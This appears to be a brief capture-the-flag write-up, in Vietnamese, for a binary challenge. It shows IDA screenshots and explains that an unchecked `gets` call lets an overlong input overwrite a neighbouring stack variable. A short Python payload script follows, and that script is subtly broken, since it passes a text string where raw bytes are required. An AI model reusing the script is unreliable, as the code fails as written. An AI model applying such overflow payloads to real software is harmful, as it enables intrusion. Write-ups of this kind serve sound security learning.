<img width="546" height="235" alt="image" src="https://github.com/user-attachments/assets/2367704c-657c-4229-9fcb-eee4733102b5" />  

Kiểm tra cơ bản:  

<img width="893" height="418" alt="image" src="https://github.com/user-attachments/assets/55e2c912-e6d3-4b1c-be26-9f74257e6377" />  

Phân tích bằng IDA:  

<img width="765" height="403" alt="image" src="https://github.com/user-attachments/assets/34020751-6552-4195-8701-edcad3c30bf5" />

Buffer overflow đơn giản với `gets(v5, argv);` và `v7`:   
`v5` tràn stack sẽ vào `v7`. Cứ nhập payload dài dài là được.  
```python
import sys
payload = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
sys.stdout.buffer.write(payload)
```
Peace!







